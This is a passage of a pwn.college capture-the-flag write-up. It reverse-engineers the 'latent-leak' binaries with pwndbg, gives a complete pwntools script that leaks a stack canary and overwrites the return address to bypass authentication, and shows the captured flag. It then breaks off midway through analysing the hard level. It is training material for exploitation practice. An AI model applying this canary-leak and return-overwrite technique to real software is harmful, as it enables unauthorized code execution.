+The challenge calls `strstr@plt` in order to find a substring `needle` within the string `haystack`. The string address is stored at `rbp-0x208` which is where our buffer is stored as well. So it looks for some substring within our string.
+
+Then if it finds the substring, it calls itself again at `challenge+2025`. Otherwise it exits.
+
+Let's see what substring it expects, because if we successfully pass it, we will get the canary value and also another chance to send the actual payload.
+
+```
+pwndbg> break *(challenge+1978)
+Breakpoint 1 at 0x26fe
+```
+
+```
+pwndbg> run
+Starting program: /challenge/latent-leak-easy 
+
+# ---- snip ----
+
+Payload size: 2
+
+# ---- snip ----
+
+Send your payload (up to 2 bytes)!
+aa
+
+# ---- snip ----
+
+You said: aa
+This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
+call to see the hidden backdoor!
+
+Breakpoint 1, 0x00006340b0a7b6fe in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7fff7aecda60 ◂— 0x6161 /* 'aa' */
+ RBX  0x6340b0a7b860 (__libc_csu_init) ◂— endbr64 
+ RCX  0x7898fe048297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0
+ RDI  0x7fff7aecda60 ◂— 0x6161 /* 'aa' */
+ RSI  0x6340b0a7d5f1 ◂— 0x4200544145504552 /* 'REPEAT' */
+ R8   0x21
+ R9   0xd
+ R10  0x6340b0a7d55f ◂— 0xa /* '\n' */
+ R11  0x246
+ R12  0x6340b0a7a200 (_start) ◂— endbr64 
+ R13  0x7fff7aeced90 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fff7aecdc60 —▸ 0x7fff7aececa0 ◂— 0
+ RSP  0x7fff7aecda20 ◂— 0
+ RIP  0x6340b0a7b6fe (challenge+1978) ◂— call strstr@plt
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x6340b0a7b6fe <challenge+1978>    call   strstr@plt                  <strstr@plt>
+        haystack: 0x7fff7aecda60 ◂— 0x6161 /* 'aa' */
+        needle: 0x6340b0a7d5f1 ◂— 0x4200544145504552 /* 'REPEAT' */
+ 
+   0x6340b0a7b703 <challenge+1983>    test   rax, rax
+   0x6340b0a7b706 <challenge+1986>    je     challenge+2032              <challenge+2032>
+ 
+   0x6340b0a7b708 <challenge+1988>    lea    rdi, [rip + 0x1ee9]     RDI => 0x6340b0a7d5f8 ◂— 'Backdoor triggered! Repeating challenge()'
+   0x6340b0a7b70f <challenge+1995>    call   puts@plt                    <puts@plt>
+ 
+   0x6340b0a7b714 <challenge+2000>    mov    rdx, qword ptr [rbp - 0x238]
+   0x6340b0a7b71b <challenge+2007>    mov    rcx, qword ptr [rbp - 0x230]
+   0x6340b0a7b722 <challenge+2014>    mov    eax, dword ptr [rbp - 0x224]
+   0x6340b0a7b728 <challenge+2020>    mov    rsi, rcx
+   0x6340b0a7b72b <challenge+2023>    mov    edi, eax
+   0x6340b0a7b72d <challenge+2025>    call   challenge                   <challenge>
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff7aecda20 ◂— 0
+01:0008│-238 0x7fff7aecda28 —▸ 0x7fff7aeceda8 —▸ 0x7fff7aecf69c ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-230 0x7fff7aecda30 —▸ 0x7fff7aeced98 —▸ 0x7fff7aecf680 ◂— '/challenge/latent-leak-easy'
+03:0018│-228 0x7fff7aecda38 ◂— 0x100000000
+04:0020│-220 0x7fff7aecda40 ◂— 0
+05:0028│-218 0x7fff7aecda48 ◂— 0x200000000
+06:0030│-210 0x7fff7aecda50 ◂— 2
+07:0038│-208 0x7fff7aecda58 —▸ 0x7fff7aecda60 ◂— 0x6161 /* 'aa' */
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x6340b0a7b6fe challenge+1978
+   1   0x6340b0a7b830 main+213
+   2   0x7898fdf5e083 __libc_start_main+243
+   3   0x6340b0a7a22e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Expected substring in order to loop the `challenge()` function: `REPEAT`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1e43`
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'error'
+
+# Initialize data
+buffer_addr = 0x7ffca8e19540
+prev_func_canary_addr = 0x7ffca8e19628
+curr_func_canary_addr = 0x7ffca8e19738
+addr_of_saved_ip = 0x7ffca8e19748
+safe_win_auth_offset = 0x1e43
+
+attempt = 0
+
+while True:
+    attempt += 1
+    p = process('/challenge/latent-leak-easy')
+    
+    try:
+        # Standard offsets for this challenge level
+        # If your previous leak was 24, try 24, but let's verify the output
+        offset_to_prev_func_canary = prev_func_canary_addr - buffer_addr               # Distance from start of buffer to the canary
+        payload_size = offset_to_prev_func_canary + 1
+
+        # --- STAGE 1: LEAK ---
+        p.recvuntil(b'Payload size: ')
+        p.sendline(str(payload_size).encode())
+
+        payload = b'REPEAT'
+        payload += b'A' * (offset_to_prev_func_canary - 6)
+        payload += b'B' 
+
+        p.recvuntil(b'bytes)!')
+        p.send(payload)
+
+        # Grab the leak
+        p.recvuntil(b'AAAAAB')
+        canary_raw = p.recv(7)
+        canary = u64(canary_raw.rjust(8, b'\x00'))
+
+        # --- STAGE 2: EXPLOIT ---
+        offset_to_prev_func_canary = curr_func_canary_addr - buffer_addr 
+        offset_to_ret = addr_of_saved_ip - (curr_func_canary_addr + 8)         # Distance from canary to the return address (usually 16 bytes: 8 for canary + 8 for RBP) 
+
+        p.recvuntil(b'Payload size: ')
+        
+        # Build payload: [Padding] + [Canary] + [RBP Padding] + [RIP Partial]
+        exploit = b"A" * offset_to_prev_func_canary
+        exploit += p64(canary)
+        exploit += b"B" * offset_to_ret
+        exploit += struct.pack("<H", safe_win_auth_offset)
+
+        p.sendline(str(len(exploit)).encode())
+        p.recvuntil(b'bytes)!')
+        p.send(exploit)
+
+        # Increase timeout slightly to allow the flag to print
+        output = p.recvall(timeout=1).decode(errors="ignore")
+        
+        if "pwn.college{" in output:
+            print(f"!!! FLAG FOUND ON ATTEMPT {attempt} !!!")
+            print(output)
+            break
+
+    except EOFError:
+        pass
+    finally:
+        p.close()
+```
+
+```
+hacker@program-security~latent-leak-easy:/$ python ~/script.py 
+!!! FLAG FOUND ON ATTEMPT 1 !!!
+
+You sent 522 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffe0a2685f0 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0a2685f8 (rsp+0x0008) | c8 9b 26 0a fe 7f 00 00 | 0x00007ffe0a269bc8 |
+| 0x00007ffe0a268600 (rsp+0x0010) | b8 9b 26 0a fe 7f 00 00 | 0x00007ffe0a269bb8 |
+| 0x00007ffe0a268608 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
+| 0x00007ffe0a268610 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0a268618 (rsp+0x0028) | 00 00 00 00 0a 02 00 00 | 0x0000020a00000000 |
+| 0x00007ffe0a268620 (rsp+0x0030) | 0a 02 00 00 00 00 00 00 | 0x000000000000020a |
+| 0x00007ffe0a268628 (rsp+0x0038) | 30 86 26 0a fe 7f 00 00 | 0x00007ffe0a268630 |
+| 0x00007ffe0a268630 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268638 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268640 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268648 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268650 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268658 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268660 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268668 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268670 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268678 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268680 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268688 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268690 (rsp+0x00a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268698 (rsp+0x00a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2686a0 (rsp+0x00b0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2686a8 (rsp+0x00b8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2686b0 (rsp+0x00c0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2686b8 (rsp+0x00c8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2686c0 (rsp+0x00d0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2686c8 (rsp+0x00d8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2686d0 (rsp+0x00e0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2686d8 (rsp+0x00e8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2686e0 (rsp+0x00f0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2686e8 (rsp+0x00f8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2686f0 (rsp+0x0100) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2686f8 (rsp+0x0108) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268700 (rsp+0x0110) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268708 (rsp+0x0118) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268710 (rsp+0x0120) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268718 (rsp+0x0128) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268720 (rsp+0x0130) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268728 (rsp+0x0138) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268730 (rsp+0x0140) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268738 (rsp+0x0148) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268740 (rsp+0x0150) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268748 (rsp+0x0158) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268750 (rsp+0x0160) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268758 (rsp+0x0168) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268760 (rsp+0x0170) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268768 (rsp+0x0178) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268770 (rsp+0x0180) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268778 (rsp+0x0188) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268780 (rsp+0x0190) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268788 (rsp+0x0198) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268790 (rsp+0x01a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268798 (rsp+0x01a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2687a0 (rsp+0x01b0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2687a8 (rsp+0x01b8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2687b0 (rsp+0x01c0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2687b8 (rsp+0x01c8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2687c0 (rsp+0x01d0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2687c8 (rsp+0x01d8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2687d0 (rsp+0x01e0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2687d8 (rsp+0x01e8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2687e0 (rsp+0x01f0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2687e8 (rsp+0x01f8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2687f0 (rsp+0x0200) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a2687f8 (rsp+0x0208) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268800 (rsp+0x0210) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268808 (rsp+0x0218) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268810 (rsp+0x0220) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268818 (rsp+0x0228) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268820 (rsp+0x0230) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffe0a268828 (rsp+0x0238) | 00 6d 18 2d 52 75 ac c3 | 0xc3ac75522d186d00 |
+| 0x00007ffe0a268830 (rsp+0x0240) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffe0a268838 (rsp+0x0248) | 43 1e 1e ce f1 5f 00 00 | 0x00005ff1ce1e1e43 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7ffe0a268630
+- the saved frame pointer (of main) is at 0x7ffe0a268830
+- the saved return address (previously to main) is at 0x7ffe0a268838
+- the saved return address is now pointing to 0x5ff1ce1e1e43.
+- the canary is stored at 0x7ffe0a268828.
+- the canary value is now 0xc3ac75522d186d00.
+- the address of win_authed() is 0x5ff1ce1e1e27.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win_authed() when it returns.
+Let's try it now!
+
+You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
+call to see the hidden backdoor!
+Goodbye!
+You win! Here is your flag:
+pwn.college{0kx4a5AU-rY-gckKRBcfAcg_bmK.0VNxMDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Latent Lunacy (Hard)
+
+```
+hacker@program-security~latent-leak-hard:/$ /challenge/latent-leak-hard 
+###
+### Welcome to /challenge/latent-leak-hard!
+###
+
+Payload size: 2
+Send your payload (up to 2 bytes)!
+aa
+You said: aa
+Goodbye!
+### Goodbye!
+```
+
+We need the following information to craft our exploit:
+- [ ] Location of buffer
+- [ ] Location of canary of the current function
+- [ ] Location of the canary of the previously executed function
+- [ ] Expected substring in order to loop the `challenge()` function
+- [ ] Location of stored return address to `main()`
+- [ ] Offset of instruction within `win_authed()` which skips the authentication
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x0000000000001110  __cxa_finalize@plt
+0x0000000000001120  putchar@plt
+0x0000000000001130  __errno_location@plt
+0x0000000000001140  puts@plt
+0x0000000000001150  write@plt
+0x0000000000001160  __stack_chk_fail@plt
+0x0000000000001170  printf@plt
+0x0000000000001180  geteuid@plt
+0x0000000000001190  read@plt
+0x00000000000011a0  setvbuf@plt
+0x00000000000011b0  open@plt
+0x00000000000011c0  __isoc99_scanf@plt
+0x00000000000011d0  exit@plt
+0x00000000000011e0  strerror@plt
+0x00000000000011f0  strstr@plt
+0x0000000000001200  _start
+0x0000000000001230  deregister_tm_clones
+0x0000000000001260  register_tm_clones
+0x00000000000012a0  __do_global_dtors_aux
+0x00000000000012e0  frame_dummy
+0x00000000000012e9  bin_padding
+0x0000000000001dad  win_authed
+0x0000000000001eca  challenge
+0x000000000000203b  main
+0x0000000000002140  __libc_csu_init
+0x00000000000021b0  __libc_csu_fini
+0x00000000000021b8  _fini
+```
+
+#### `win_authed()`
+
+```
+pwndbg> disassemble win_authed 
+Dump of assembler code for function win_authed:
+   0x0000000000001dad <+0>:     endbr64
+   0x0000000000001db1 <+4>:     push   rbp
+   0x0000000000001db2 <+5>:     mov    rbp,rsp
+   0x0000000000001db5 <+8>:     sub    rsp,0x10
+   0x0000000000001db9 <+12>:    mov    DWORD PTR [rbp-0x4],edi
+   0x0000000000001dbc <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
+   0x0000000000001dc3 <+22>:    jne    0x1ec7 <win_authed+282>
+   0x0000000000001dc9 <+28>:    lea    rdi,[rip+0x1238]        # 0x3008
+
+# ---- snip ----
+
+   0x0000000000001ec7 <+282>:   nop
+   0x0000000000001ec8 <+283>:   leave
+   0x0000000000001ec9 <+284>:   ret
+End of assembler dump.
+```
+
+- [ ] Location of buffer
+- [ ] Location of canary of the current function
+- [ ] Location of the canary of the previously executed function
+- [ ] Expected substring in order to loop the `challenge()` function
+- [ ] Location of stored return address to `main()`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1dc9`
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge 
+Dump of assembler code for function challenge:
+   0x0000000000001eca <+0>:     endbr64
+   0x0000000000001ece <+4>:     push   rbp
+   0x0000000000001ecf <+5>:     mov    rbp,rsp
+   0x0000000000001ed2 <+8>:     sub    rsp,0x190
+   0x0000000000001ed9 <+15>:    mov    DWORD PTR [rbp-0x174],edi
+   0x0000000000001edf <+21>:    mov    QWORD PTR [rbp-0x180],rsi
+   0x0000000000001ee6 <+28>:    mov    QWORD PTR [rbp-0x188],rdx
+   0x0000000000001eed <+35>:    mov    rax,QWORD PTR fs:0x28
+   0x0000000000001ef6 <+44>:    mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000001efa <+48>:    xor    eax,eax
+   0x0000000000001efc <+50>:    lea    rax,[rbp-0x150]
+   0x0000000000001f03 <+57>:    mov    QWORD PTR [rbp-0x158],rax
+   0x0000000000001f0a <+64>:    mov    QWORD PTR [rbp-0x160],0x0
+   0x0000000000001f15 <+75>:    lea    rdi,[rip+0x11f0]        # 0x310c
+   0x0000000000001f1c <+82>:    mov    eax,0x0
+   0x0000000000001f21 <+87>:    call   0x1170 <printf@plt>
+   0x0000000000001f26 <+92>:    lea    rax,[rbp-0x160]
+   0x0000000000001f2d <+99>:    mov    rsi,rax
+   0x0000000000001f30 <+102>:   lea    rdi,[rip+0x11e4]        # 0x311b
+   0x0000000000001f37 <+109>:   mov    eax,0x0
+   0x0000000000001f3c <+114>:   call   0x11c0 <__isoc99_scanf@plt>
+   0x0000000000001f41 <+119>:   mov    rax,QWORD PTR [rbp-0x160]
+   0x0000000000001f48 <+126>:   mov    rsi,rax
+   0x0000000000001f4b <+129>:   lea    rdi,[rip+0x11ce]        # 0x3120
+   0x0000000000001f52 <+136>:   mov    eax,0x0
+   0x0000000000001f57 <+141>:   call   0x1170 <printf@plt>
+   0x0000000000001f5c <+146>:   mov    rdx,QWORD PTR [rbp-0x160]
+   0x0000000000001f63 <+153>:   mov    rax,QWORD PTR [rbp-0x158]
+   0x0000000000001f6a <+160>:   mov    rsi,rax
+   0x0000000000001f6d <+163>:   mov    edi,0x0
+   0x0000000000001f72 <+168>:   call   0x1190 <read@plt>
+   0x0000000000001f77 <+173>:   mov    DWORD PTR [rbp-0x164],eax
+   0x0000000000001f7d <+179>:   cmp    DWORD PTR [rbp-0x164],0x0
+   0x0000000000001f84 <+186>:   jns    0x1fb2 <challenge+232>
+   0x0000000000001f86 <+188>:   call   0x1130 <__errno_location@plt>
+   0x0000000000001f8b <+193>:   mov    eax,DWORD PTR [rax]
+   0x0000000000001f8d <+195>:   mov    edi,eax
+   0x0000000000001f8f <+197>:   call   0x11e0 <strerror@plt>
+   0x0000000000001f94 <+202>:   mov    rsi,rax
+   0x0000000000001f97 <+205>:   lea    rdi,[rip+0x11aa]        # 0x3148
+   0x0000000000001f9e <+212>:   mov    eax,0x0
+   0x0000000000001fa3 <+217>:   call   0x1170 <printf@plt>
+   0x0000000000001fa8 <+222>:   mov    edi,0x1
+   0x0000000000001fad <+227>:   call   0x11d0 <exit@plt>
+   0x0000000000001fb2 <+232>:   mov    rax,QWORD PTR [rbp-0x158]
+   0x0000000000001fb9 <+239>:   mov    rsi,rax
+   0x0000000000001fbc <+242>:   lea    rdi,[rip+0x11a9]        # 0x316c
+   0x0000000000001fc3 <+249>:   mov    eax,0x0
+   0x0000000000001fc8 <+254>:   call   0x1170 <printf@plt>
+   0x0000000000001fcd <+259>:   mov    rax,QWORD PTR [rbp-0x158]
+   0x0000000000001fd4 <+266>:   lea    rsi,[rip+0x11a3]        # 0x317e
+   0x0000000000001fdb <+273>:   mov    rdi,rax
+   0x0000000000001fde <+276>:   call   0x11f0 <strstr@plt>
+   0x0000000000001fe3 <+281>:   test   rax,rax
+   0x0000000000001fe6 <+284>:   je     0x2014 <challenge+330>
+   0x0000000000001fe8 <+286>:   lea    rdi,[rip+0x1199]        # 0x3188
+   0x0000000000001fef <+293>:   call   0x1140 <puts@plt>
+   0x0000000000001ff4 <+298>:   mov    rdx,QWORD PTR [rbp-0x188]
+   0x0000000000001ffb <+305>:   mov    rcx,QWORD PTR [rbp-0x180]
+   0x0000000000002002 <+312>:   mov    eax,DWORD PTR [rbp-0x174]
+   0x0000000000002008 <+318>:   mov    rsi,rcx
+   0x000000000000200b <+321>:   mov    edi,eax
+   0x000000000000200d <+323>:   call   0x1eca <challenge>
+   0x0000000000002012 <+328>:   jmp    0x2025 <challenge+347>
+   0x0000000000002014 <+330>:   lea    rdi,[rip+0x1197]        # 0x31b2
+   0x000000000000201b <+337>:   call   0x1140 <puts@plt>
+   0x0000000000002020 <+342>:   mov    eax,0x0
+   0x0000000000002025 <+347>:   mov    rcx,QWORD PTR [rbp-0x8]
+   0x0000000000002029 <+351>:   xor    rcx,QWORD PTR fs:0x28
+   0x0000000000002032 <+360>:   je     0x2039 <challenge+367>
+   0x0000000000002034 <+362>:   call   0x1160 <__stack_chk_fail@plt>
+   0x0000000000002039 <+367>:   leave
+   0x000000000000203a <+368>:   ret
+End of assembler dump.
+```
+
+Let's set breakpoints at `challenge+168` and `challenge+276` and run in order to get the address of the buffer and the expected substring.
+
+```
+pwndbg> break *(challenge+168)
+Breakpoint 1 at 0x1f72
+```
+
+```
+pwndbg> break *(challenge+276)
+Breakpoint 2 at 0x1fde
+```
+
+```
+pwndbg> run
+Starting program: /challenge/latent-leak-hard 
+###
+### Welcome to /challenge/latent-leak-hard!
+###
+
+Payload size: 2
+Send your payload (up to 2 bytes)!
+
+Breakpoint 1, 0x000056877356cf72 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffc645e7d90 ◂— 0
+ RBX  0x56877356d140 (__libc_csu_init) ◂— endbr64 
+ RCX  0
+ RDX  2
+ RDI  0
+ RSI  0x7ffc645e7d90 ◂— 0
+ R8   0x23
+ R9   0x23
+ R10  0x56877356e13c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x56877356c200 (_start) ◂— endbr64 
+ R13  0x7ffc645e9010 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffc645e7ee0 —▸ 0x7ffc645e8f20 ◂— 0
+ RSP  0x7ffc645e7d50 ◂— 0
+ RIP  0x56877356cf72 (challenge+168) ◂— call read@plt
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x56877356cf72 <challenge+168>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/0)
+        buf: 0x7ffc645e7d90 ◂— 0
+        nbytes: 2
+ 
+   0x56877356cf77 <challenge+173>    mov    dword ptr [rbp - 0x164], eax
+   0x56877356cf7d <challenge+179>    cmp    dword ptr [rbp - 0x164], 0
+   0x56877356cf84 <challenge+186>    jns    challenge+232               <challenge+232>
+ 
+   0x56877356cf86 <challenge+188>    call   __errno_location@plt        <__errno_location@plt>
+ 
+   0x56877356cf8b <challenge+193>    mov    eax, dword ptr [rax]
+   0x56877356cf8d <challenge+195>    mov    edi, eax
+   0x56877356cf8f <challenge+197>    call   strerror@plt                <strerror@plt>
+ 
+   0x56877356cf94 <challenge+202>    mov    rsi, rax
+   0x56877356cf97 <challenge+205>    lea    rdi, [rip + 0x11aa]     RDI => 0x56877356e148 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x56877356cf9e <challenge+212>    mov    eax, 0                  EAX => 0
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffc645e7d50 ◂— 0
+01:0008│-188 0x7ffc645e7d58 —▸ 0x7ffc645e9028 —▸ 0x7ffc645e969c ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-180 0x7ffc645e7d60 —▸ 0x7ffc645e9018 —▸ 0x7ffc645e9680 ◂— '/challenge/latent-leak-hard'
+03:0018│-178 0x7ffc645e7d68 ◂— 0x100000000
+04:0020│-170 0x7ffc645e7d70 ◂— 0
+05:0028│-168 0x7ffc645e7d78 ◂— 0
+06:0030│-160 0x7ffc645e7d80 ◂— 2
+07:0038│-158 0x7ffc645e7d88 —▸ 0x7ffc645e7d90 ◂— 0
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x56877356cf72 challenge+168
+   1   0x56877356d110 main+213
+   2   0x74d581335083 __libc_start_main+243
+   3   0x56877356c22e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of buffer: `0x7ffc645e7d90`
+- [ ] Location of canary of the current function
+- [ ] Location of the canary of the previously executed function
+- [ ] Expected substring in order to loop the `challenge()` function
+- [ ] Location of stored return address to `main()`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1dc9`
+
+Before we continue execution, let's get the location saved return address and values of the two canaries.
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffc645e7ef0:
+ rip = 0x56877356cf72 in challenge; saved rip = 0x56877356d110
+ called by frame at 0x7ffc645e8f30
+ Arglist at 0x7ffc645e7ee0, args: 
+ Locals at 0x7ffc645e7ee0, Previous frame's sp is 0x7ffc645e7ef0
+ Saved registers:
+  rbp at 0x7ffc645e7ee0, rip at 0x7ffc645e7ee8
+```
+
+- [x] Location of buffer: `0x7ffc645e7d90`
+- [ ] Location of canary of the current function
+- [ ] Location of the canary of the previously executed function
